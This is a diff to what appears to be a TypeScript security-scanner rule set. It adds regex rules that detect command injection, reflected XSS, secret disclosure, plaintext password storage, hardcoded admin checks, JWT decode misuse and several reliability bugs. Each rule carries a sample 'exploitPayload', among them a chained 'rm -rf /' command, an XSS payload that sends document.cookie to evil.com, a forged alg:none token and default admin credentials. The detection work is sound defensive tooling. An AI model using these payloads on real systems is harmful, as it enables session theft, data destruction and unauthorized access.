@@ -874,7 +874,7 @@ const V141_RULES: Rule[] = [
   {
     id: 'math-random-crypto',
     title: 'Math.random() used for security token — predictable, not cryptographically secure',
-    pattern: /Math\.random\s*\(\s*\)[^;]{0,80}(?:token|secret|key|session|csrf|nonce|salt|id)/i,
+    pattern: /Math\.random\s*\(\s*\)[^\n;]{0,40}(?:token|secret|session|csrf|nonce|salt|password|apiKey)/i,
     mitigatedBy: [/crypto\.randomBytes|crypto\.getRandomValues|randomUUID/],
     severity: 'high', category: 'security',
     explanation: 'Math.random() is a pseudorandom generator seeded with system time — predictable by an attacker who can observe outputs. Never use for tokens, sessions, or any security-sensitive value.',
@@ -1092,3 +1092,181 @@ const V142_RULES: Rule[] = [
 ];
 
 (RULES as Rule[]).push(...V142_RULES);
+// ═══════════════════════════════════════════════════════════════════════════════
+// v1.4.2 PATCH — Multi-line Traps, Logic Bugs & Reliability (Python/Cross-Lang)
+// Fixes the "Newline Blindspot" and adds missing Reliability/Logic rules
+// ═══════════════════════════════════════════════════════════════════════════════
+const V142_MULTI_LINE_AND_LOGIC_RULES: Rule[] = [
+  // ── FIX: MULTI-LINE SUBPROCESS (The Newline Trap) ───────────────────────
+  {
+    id: 'python-subprocess-multiline-shell',
+    title: 'Command Injection — subprocess with shell=True (multi-line)',
+    // [\s\S]*? matches ANY character including newlines, fixing the blind spot
+    pattern: /subprocess\.\w+\s*\([\s\S]*?shell\s*=\s*True/,
+    mitigatedBy: [/shell\s*=\s*False/],
+    severity: 'high',
+    category: 'security',
+    explanation: 'subprocess called with shell=True. Because the arguments span multiple lines, standard single-line regexes miss this. shell=True passes the command to /bin/sh, allowing OS command injection via shell metacharacters (;, |, &&).',
+    exploitPayload: 'job["command"] = "echo safe; rm -rf /" → subprocess executes the chained command → RCE',
+    fix: 'Use shell=False (default) and pass arguments as a list: subprocess.check_output(["echo", cmd], text=True)',
+  },
+
+  // ── SILENT EXCEPTION SUPPRESSION ────────────────────────────────────────
+  {
+    id: 'python-bare-except-pass',
+    title: 'Silent Exception Suppression — bare except or Exception with pass',
+    pattern: /except\s*(Exception)?:\s*\n\s*pass/,
+    severity: 'high',
+    category: 'maintainability',
+    explanation: 'Catching all exceptions and silently passing hides critical errors, security violations, and system crashes. If a security check fails or a database connection drops, the application continues in an undefined, potentially compromised state.',
+    exploitPayload: 'Auth check throws DB ConnectionError → except: pass → user is granted access by default because the denial logic was skipped',
+    fix: 'Catch specific exceptions and log them. Never use bare except: pass in security or control-flow logic.',
+  },
+
+  // ── RACE CONDITION: SHARED GLOBALS ──────────────────────────────────────
+  {
+    id: 'python-global-mutable-state',
+    title: 'Race Condition — shared global mutable state accessed by threads',
+    pattern: /global\s+\w+[\s\S]{0,200}?(?:append|extend|\+=|=\s*\w+\s*\+)/,
+    severity: 'medium',
+    category: 'logic',
+    explanation: 'Multiple threads modify a global list or dictionary without a threading.Lock(). This causes data corruption, lost updates, and unpredictable state.',
+    exploitPayload: 'Thread 1 reads counter=0. Thread 2 reads counter=0. Both increment. Result is 1 instead of 2. (Data loss)',
+    fix: 'Use a threading.Lock() to guard shared state, or use thread-safe queues (queue.Queue).',
+  },
+
+  // ── UNBOUNDED MEMORY GROWTH (CACHE) ─────────────────────────────────────
+  {
+    id: 'python-unbounded-dict-cache',
+    title: 'Unbounded Memory Growth — dictionary used as cache without LRU',
+    pattern: /(?:cache|_cache|memo)\s*\[\s*[\w.]+\s*\]\s*=/,
+    mitigatedBy: [/lru_cache|functools\.lru_cache|maxsize|OrderedDict|TTLCache/],
+    severity: 'medium',
+    category: 'logic',
+    explanation: 'A global dictionary is used to cache data, but entries are never evicted. Under load, this will consume all available RAM and crash the process (OOM Kill).',
+    exploitPayload: 'Attacker sends 10 million unique requests → cache dict grows to 10M entries → server runs out of RAM → crashes (DoS)',
+    fix: 'Use functools.lru_cache(maxsize=1024) or cachetools.TTLCache to enforce a maximum size and evict old entries.',
+  },
+
+  // ── UNSAFE TEMP FILE (FD LEAK / SYMLINK ATTACK) ─────────────────────────
+  {
+    id: 'python-unsafe-mkstemp',
+    title: 'Unsafe Temp File — mkstemp() without os.close() or context manager',
+    pattern: /(?:fd|file_desc)\s*,\s*(?:path|tmp_path)\s*=\s*tempfile\.mkstemp\s*\(/,
+    mitigatedBy: [/os\.close\s*\(|NamedTemporaryFile|TemporaryDirectory/],
+    severity: 'medium',
+    category: 'security',
+    explanation: 'tempfile.mkstemp() returns an open file descriptor and a path. If the FD is not closed via os.close(fd), it leaks. Furthermore, using the path directly without secure permissions can lead to symlink attacks.',
+    exploitPayload: 'Process leaks 1000 FDs → hits ulimit → crashes. Or attacker creates a symlink at the temp path → app overwrites /etc/passwd.',
+    fix: 'Use tempfile.NamedTemporaryFile(delete=True) which handles FD closing and secure deletion automatically.',
+  },
+
+  // ── INFINITE WORKER LOOPS (NO GRACEFUL SHUTDOWN) ────────────────────────
+  {
+    id: 'python-infinite-worker-no-shutdown',
+    title: 'Infinite Worker Loop — missing graceful shutdown mechanism',
+    pattern: /while\s+True:\s*\n\s*(?:try:|[\w.]+\s*=\s*[\w.]+\.get\s*\()/,
+    severity: 'low',
+    category: 'maintainability',
+    explanation: 'Worker threads run in an infinite `while True:` loop without checking a shutdown flag or using a timeout on queue.get(). This prevents the application from shutting down cleanly, leaving zombie processes.',
+    exploitPayload: 'Ctrl+C (KeyboardInterrupt) → main thread exits → daemon threads hang indefinitely or orphaned processes consume CPU.',
+    fix: 'Use a threading.Event() as a shutdown flag: `while not stop_event.is_set():` or use `queue.get(timeout=1)` to allow periodic exit checks.',
+  },
+
+  // ── PLAINTEXT PASSWORD STORAGE (Cross-Language) ─────────────────────────
+  {
+    id: 'plaintext-password-storage-class',
+    title: 'Cleartext Password Storage — password saved as plain string in object',
+    pattern: /self\.(?:password|passwd|pwd)\s*=\s*(?:password|pwd|pass_str)/,
+    mitigatedBy: [/bcrypt|argon2|hashlib|werkzeug\.security\.generate_password_hash/],
+    severity: 'high',
+    category: 'security',
+    explanation: 'The class stores the user password in plaintext. If the object is serialized, logged, or dumped to a database, the password is exposed.',
+    exploitPayload: 'Memory dump or log leak exposes User objects → all passwords visible in cleartext.',
+    fix: 'Hash the password immediately upon receipt: self.password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())',
+  },
+
+  // ── BROKEN AUTH: HARDCODED ADMIN BYPASS ─────────────────────────────────
+  {
+    id: 'hardcoded-admin-bypass',
+    title: 'Authorization Bypass — hardcoded admin check',
+    pattern: /(?:username|user)\s*==\s*["']admin["']/,
+    severity: 'high',
+    category: 'security',
+    explanation: 'Admin privileges are determined by a hardcoded string comparison rather than a role-based access control (RBAC) system or database flag.',
+    exploitPayload: 'Attacker registers the username "admin" → bypasses all authorization checks.',
+    fix: 'Use a database-backed role system: if user.role == Role.ADMIN:',
+  },
+];
+
+(RULES as Rule[]).push(...V142_MULTI_LINE_AND_LOGIC_RULES);
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// v1.4.3 RULES — Express.js Multi-line Traps & Auth Bypasses
+// Fixes the "Newline Blindspot" for SQLi, XSS, and Env Disclosure
+// ═══════════════════════════════════════════════════════════════════════════════
+const V143_EXPRESS_RULES: Rule[] = [
+  // ── EXPRESS: REFLECTED XSS VIA TEMPLATE LITERAL HTML ────────────────────
+  {
+    id: 'express-xss-template-html-multiline',
+    title: 'Reflected XSS — user input interpolated into HTML template literal',
+    // [\s\S]*? matches ANY character including newlines, fixing the blind spot
+    pattern: /(?:const|let|var)\s+\w+\s*=\s*`[\s\S]*?<(?:h[1-6]|p|div|span|a|script|iframe)[\s\S]*?\$\{[\s\S]*?req\.(?:query|params|body|headers)/i,
+    severity: 'high',
+    category: 'security',
+    explanation: 'User-controlled request data is interpolated directly into an HTML string without escaping. When sent to the browser, it executes as trusted JavaScript (Reflected XSS).',
+    exploitPayload: 'GET /profile?name=<img src=x onerror=fetch("https://evil.com/steal?c="+document.cookie)> → session hijack',
+    fix: 'Use a template engine with auto-escaping (EJS, Pug) or escape manually: const escapeHtml = require("escape-html"); res.send(`<h1>${escapeHtml(req.query.name)}</h1>`);',
+  },
+
+  // ── EXPRESS: SENSITIVE INFO DISCLOSURE (MULTILINE) ──────────────────────
+  {
+    id: 'express-env-disclosure-multiline',
+    title: 'Sensitive Information Disclosure — process.env or secrets sent to client',
+    pattern: /res\.(?:send|json|status\s*\(\s*\d+\s*\)\s*\.\s*(?:send|json))\s*\(\s*\{[\s\S]*?(?:process\.env|SECRET|API_KEY|DATABASE_URL|JWT_SECRET)[\s\S]*?\}/i,
+    severity: 'high',
+    category: 'security',
+    explanation: 'Server environment variables or hardcoded secrets are serialized into the HTTP response. This exposes API keys, database credentials, and internal infrastructure to anyone who calls the endpoint.',
+    exploitPayload: 'curl http://target/debug → {"env":{"DB_PASSWORD":"prod-secret","AWS_KEY":"..."}}',
+    fix: 'Never expose process.env or internal state to clients. Remove the debug endpoint entirely in production.',
+  },
+
+  // ── SQLITE / RAW SQL: PLAINTEXT PASSWORD STORAGE ────────────────────────
+  {
+    id: 'sql-plaintext-password-insert',
+    title: 'Plaintext Password Storage — password inserted directly into SQL query',
+    pattern: /(?:INSERT|UPDATE)[\s\S]*?(?:password|passwd|pwd)[\s\S]*?(?:VALUES|SET)[\s\S]*?(?:\$\{|\+\s*|'\s*,\s*')/i,
+    mitigatedBy: [/bcrypt\.hash|argon2|hashPassword|encrypt/],
+    severity: 'high',
+    category: 'security',
+    explanation: 'Passwords are stored in the database in plaintext. If the database is compromised, all user credentials are immediately exposed. Additionally, the use of string interpolation here indicates SQL Injection.',
+    exploitPayload: 'DB Dump: SELECT password FROM users → "admin123" (instant credential theft)',
+    fix: 'Hash passwords before storage: const hash = await bcrypt.hash(password, 12); db.run("INSERT INTO users(password) VALUES(?)", [hash]);',
+  },
+
+  // ── HARDCODED ADMIN CREDENTIALS IN DB SEED ────────────────────────────────
+  {
+    id: 'hardcoded-admin-seed',
+    title: 'Hardcoded Admin Credentials — default admin user seeded with plaintext password',
+    pattern: /INSERT[\s\S]*?(?:admin|root|superuser)[\s\S]*?(?:admin123|password|123456|qwerty)/i,
+    severity: 'high',
+    category: 'security',
+    explanation: 'The database is seeded with a hardcoded administrative account and a weak/plaintext password. Attackers will immediately attempt to log in with default credentials to gain full system access.',
+    exploitPayload: 'POST /login {"username":"admin","password":"admin123"} → 200 OK → Full Admin Access',
+    fix: 'Remove hardcoded admin seeds from production code. Force admin creation via a secure, one-time CLI setup script with a strong, user-defined password.',
+  },
+
+  // ── JWT: ALGORITHM NONE / DECODE WITHOUT VERIFY ─────────────────────────
+  {
+    id: 'jwt-decode-auth-bypass-multiline',
+    title: 'Authentication Bypass — jwt.decode() used instead of jwt.verify()',
+    pattern: /jwt\.decode\s*\([\s\S]*?(?:req\.|token|auth)/i,
+    mitigatedBy: [/jwt\.verify/],
+    severity: 'high',
+    category: 'security',
+    explanation: 'jwt.decode() only base64-decodes the token payload; it DOES NOT verify the cryptographic signature. An attacker can forge any payload (e.g., {"role":"admin"}) and the server will accept it as valid.',
+    exploitPayload: 'Header: {"alg":"none"} Payload: {"role":"admin"} → server accepts forged token → privilege escalation',
+    fix: 'Always use jwt.verify(token, SECRET, { algorithms: ["HS256"] }) to cryptographically validate the signature.',
+  },
+];
+(RULES as Rule[]).push(...V143_EXPRESS_RULES);
